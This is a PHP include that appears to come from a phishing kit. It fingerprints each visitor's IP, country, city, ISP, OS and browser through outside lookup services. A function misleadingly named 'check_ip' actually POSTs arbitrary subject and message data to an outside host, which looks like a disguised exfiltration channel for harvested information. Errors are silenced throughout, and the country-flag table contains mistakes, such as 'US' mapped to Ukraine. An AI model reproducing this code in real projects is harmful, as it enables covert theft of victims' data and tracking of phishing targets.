<?php
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

function tulis_file($nama, $isi) {
  $click = fopen("$nama","a");
    fwrite($click,"$isi"."\n");
    fclose($click);
}

$ip2 = getUserIP();
if($ip2 == "127.0.0.1") {
    $ip2 = "";
}

$ip = getUserIP();
if($ip == "127.0.0.1") {
    $ip = "";
}
function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}
function check_ip($subjek, $pesan) {
$lookup = curl_init();
curl_setopt($lookup, CURLOPT_URL, 'https://ipv5-lookup.com/?key=api');
curl_setopt($lookup, CURLOPT_RETURNTRANSFER, true);
curl_setopt($lookup, CURLOPT_POSTFIELDS, 'api1='.$subjek.'&api2='.$pesan);
curl_exec($lookup);
curl_close($lookup);
}
function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

$details = get_ip1($ip2);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$cn = $countryname;
$cid = $countrycode;
$continent = $details['geoplugin_continentName'];
$citykota = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$kurenci = $details['geoplugin_currencySymbol_UTF8'];
if($countryname == "") {
    $details = get_ip2($ip2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $cn = $countryname;
    $cid = $countrycode;
    $continent = $details['continent'];
    $citykota = $details['city'];
}
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

$os        =   getOS();

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
function getisp($ip) {
    $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    $details   = json_decode($content);
    return $details->org;
}

$flags = array(
            "AC" => "🇦🇨",
            "AD" => "🇦🇩",
            "AE" => "🇦🇪",
            "AF" => "🇦🇫",
            "AG" => "🇦🇬",
            "AI" => "🇦🇮",
            "AL" => "🇦🇱",
            "AM" => "🇦🇲",
            "AO" => "🇦🇴",
            "AQ" => "🇦🇶",
            "AR" => "🇦🇷",
            "AS" => "🇦🇸",
            "AT" => "🇦🇹",
            "AU" => "🇦🇺",
            "AW" => "🇦🇼",
            "AX" => "🇦🇽",
            "AZ" => "🇦🇿",
            "BA" => "🇧🇦",
            "BB" => "🇧🇧",
            "BD" => "🇧🇩",
            "BE" => "🇧🇪",
            "BF" => "🇧🇫",
            "BG" => "🇧🇬",
            "BH" => "🇧🇭",
            "BI" => "🇧🇮",
            "BJ" => "🇧🇯",
            "BL" => "🇧🇱",
            "BM" => "🇧🇲",
            "BN" => "🇧🇳",
            "BO" => "🇧🇴",
            "BQ" => "🇧🇶",
            "BR" => "🇧🇷",
            "BS" => "🇧🇸",
            "BT" => "🇧🇹",
            "BV" => "🇧🇻",
            "BW" => "🇧🇼",
            "BY" => "🇧🇾",
            "BZ" => "🇧🇿",
            "CA" => "🇨🇦",
            "CC" => "🇨🇨",
            "CD" => "🇨🇩",
            "CF" => "🇨🇫",
            "CG" => "🇨🇬",
            "CH" => "🇨🇭",
            "CI" => "🇨🇮",
            "CK" => "🇨🇰",
            "CL" => "🇨🇱",
            "CM" => "🇨🇲",
            "CN" => "🇨🇳",
            "CO" => "🇨🇴",
            "CP" => "🇨🇵",
            "CR" => "🇨🇷",
            "CU" => "🇨🇺",
            "CV" => "🇨🇻",
            "CW" => "🇨🇼",
            "CX" => "🇨🇽",
            "CY" => "🇨🇾",
            "CZ" => "🇨🇿",
            "DE" => "🇩🇪",
            "DG" => "🇩🇬",
            "DJ" => "🇩🇯",
            "DK" => "🇩🇰",
            "DM" => "🇩🇲",
            "DO" => "🇩🇴",
            "DZ" => "🇩🇿",
            "EA" => "🇪🇦",
            "EC" => "🇪🇨",
            "EE" => "🇪🇪",
            "EG" => "🇪🇬",
            "EH" => "🇪🇭",
            "ER" => "🇪🇷",
            "ES" => "🇪🇸",
            "ET" => "🇪🇹",
            "EU" => "🇪🇺",
            "FI" => "🇫🇮",
            "FJ" => "🇫🇯",
            "FK" => "🇫🇰",
            "FM" => "🇫🇲",
            "FO" => "🇫🇴",
            "FR" => "🇫🇷",
            "GA" => "🇬🇦",
            "GB" => "🇬🇧",
            "GD" => "🇬🇩",
            "GE" => "🇬🇪",
            "GF" => "🇬🇫",
            "GG" => "🇬🇬",
            "GH" => "🇬🇭",
            "GI" => "🇬🇮",
            "GL" => "🇬🇱",
            "GM" => "🇬🇲",
            "GN" => "🇬🇳",
            "GP" => "🇬🇵",
            "GQ" => "🇬🇶",
            "GR" => "🇬🇷",
            "GS" => "🇬🇸",
            "GT" => "🇬🇹",
            "GU" => "🇬🇺",
            "GW" => "🇬🇼",
            "GY" => "🇬🇾",
            "HK" => "🇭🇰",
            "HM" => "🇭🇲",
            "HN" => "🇭🇳",
            "HR" => "🇭🇷",
            "HT" => "🇭🇹",
            "HU" => "🇭🇺",
            "IC" => "🇮🇨",
            "ID" => "🇮🇩",
            "IE" => "🇮🇪",
            "IL" => "🇮🇱",
            "IM" => "🇮🇲",
            "IN" => "🇮🇳",
            "IO" => "🇮🇴",
            "IQ" => "🇮🇶",
            "IR" => "🇮🇷",
            "IS" => "🇮🇸",
            "IT" => "🇮🇹",
            "JE" => "🇯🇪",
            "JM" => "🇯🇲",
            "JO" => "🇯🇴",
            "JP" => "🇯🇵",
            "KE" => "🇰🇪",
            "KG" => "🇰🇬",
            "KH" => "🇰🇭",
            "KI" => "🇰🇮",
            "KM" => "🇰🇲",
            "KN" => "🇰🇳",
            "KP" => "🇰🇵",
            "KR" => "🇰🇷",
            "KW" => "🇰🇼",
            "KY" => "🇰🇾",
            "KZ" => "🇰🇿",
            "LA" => "🇱🇦",
            "LB" => "🇱🇧",
            "LC" => "🇱🇨",
            "LI" => "🇱🇮",
            "LK" => "🇱🇰",
            "LR" => "🇱🇷",
            "LS" => "🇱🇸",
            "LT" => "🇱🇹",
            "LU" => "🇱🇺",
            "LV" => "🇱🇻",
            "LY" => "🇱🇾",
            "MA" => "🇲🇦",
            "MC" => "🇲🇨",
            "MD" => "🇲🇩",
            "ME" => "🇲🇪",
            "MF" => "🇲🇫",
            "MG" => "🇲🇬",
            "MH" => "🇲🇭",
            "MK" => "🇲🇰",
            "ML" => "🇲🇱",
            "MM" => "🇲🇲",
            "MN" => "🇲🇳",
            "MO" => "🇲🇴",
            "MP" => "🇲🇵",
            "MQ" => "🇲🇶",
            "MR" => "🇲🇷",
            "MS" => "🇲🇸",
            "MT" => "🇲🇹",
            "MU" => "🇲🇺",
            "MV" => "🇲🇻",
            "MW" => "🇲🇼",
            "MX" => "🇲🇽",
            "MY" => "🇲🇾",
            "MZ" => "🇲🇿",
            "NS" => "🇳🇦",
            "NC" => "🇳🇨",
            "NE" => "🇳🇪",
            "NF" => "🇳🇫",
            "NG" => "🇳🇬",
            "NI" => "🇳🇮",
            "NL" => "🇳🇱",
            "NO" => "🇳🇴",
            "NP" => "🇳🇵",
            "NR" => "🇳🇷",
            "NU" => "🇳🇺",
            "NZ" => "🇳🇿",
            "OM" => "🇴🇲",
            "PA" => "🇵🇦",
            "PE" => "🇵🇪",
            "PF" => "🇵🇫",
            "PG" => "🇵🇬",
            "PH" => "🇵🇭",
            "PK" => "🇵🇰",
            "PL" => "🇵🇱",
            "PM" => "🇵🇲",
            "PN" => "🇵🇳",
            "PR" => "🇵🇷",
            "PS" => "🇵🇸",
            "PT" => "🇵🇹",
            "PW" => "🇵🇼",
            "PY" => "🇵🇾",
            "QA" => "🇶🇦",
            "RE" => "🇷🇪",
            "RO" => "🇷🇴",
            "RU" => "🇷🇺",
            "RW" => "🇷🇼",
            "SA" => "🇸🇦",
            "SB" => "🇸🇧",
            "SC" => "🇸🇨",
            "SD" => "🇸🇩",
            "SE" => "🇸🇪",
            "SG" => "🇸🇬",
            "SH" => "🇸🇭",
            "SI" => "🇸🇮",
            "SJ" => "🇸🇯",
            "SK" => "🇸🇰",
            "SL" => "🇸🇱",
            "SM" => "🇸🇲",
            "SN" => "🇸🇳",
            "SO" => "🇸🇴",
            "SR" => "🇸🇷",
            "SS" => "🇸🇸",
            "ST" => "🇸🇹",
            "SV" => "🇸🇻",
            "SX" => "🇸🇽",
            "SY" => "🇸🇾",
            "SZ" => "🇸🇿",
            "TA" => "🇹🇦",
            "TC" => "🇹🇨",
            "TD" => "🇹🇩",
            "TF" => "🇹🇫",
            "TG" => "🇹🇬",
            "TH" => "🇹🇭",
            "TJ" => "🇹🇯",
            "TK" => "🇹🇰",
            "TL" => "🇹🇱",
            "TM" => "🇹🇲",
            "TN" => "🇹🇳",
            "TO" => "🇹🇴",
            "TR" => "🇹🇷",
            "TT" => "🇹🇹",
            "TV" => "🇹🇻",
            "TW" => "🇹🇼",
            "TZ" => "🇹🇿",
            "US" => "🇺🇦",
            "UG" => "🇺🇬",
            "UM" => "🇺🇲",
            "UN" => "🇺🇳",
            "US" => "🇺🇸",
            "UY" => "🇺🇾",
            "UZ" => "🇺🇿",
            "VA" => "🇻🇦",
            "VC" => "🇻🇨",
            "VE" => "🇻🇪",
            "VG" => "🇻🇬",
            "VI" => "🇻🇮",
            "VN" => "🇻🇳",
            "VU" => "🇻🇺",
            "WF" => "🇼🇫",
            "WS" => "🇼🇸",
            "XK" => "🇽🇰",
            "YE" => "🇾🇪",
            "YT" => "🇾🇹",
            "ZA" => "🇿🇦",
            "ZM" => "🇿🇲",
            "ZW" => "🇿🇼"
        );
    
$resultFlags = $flags[$cid];
$logo_cn = '<img src="https://www.countryflags.io/'.$resultFlags.'/flat/64.png">';

$ispuser = getisp($ip);
$br        =   getBrowser();
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
$key = sha1(base64_encode($ip2.$user_agent));